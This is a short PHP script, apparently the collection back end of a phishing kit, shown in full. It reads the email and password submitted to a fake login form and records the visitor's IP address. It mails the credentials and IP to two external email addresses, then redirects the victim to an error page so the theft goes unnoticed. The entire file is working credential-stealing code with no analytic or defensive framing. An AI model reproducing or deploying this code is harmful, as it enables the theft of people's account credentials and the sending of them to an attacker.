<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['password']."\n";
$message .= "\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "\n";
$message .= "\n";
$message .= "\n";
$send = "quadrars37@yandex.com, quadrars37@gmail.com";
$subject = " Other//s | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: error.php");
}else{
header ("Location: error.php");
}

?>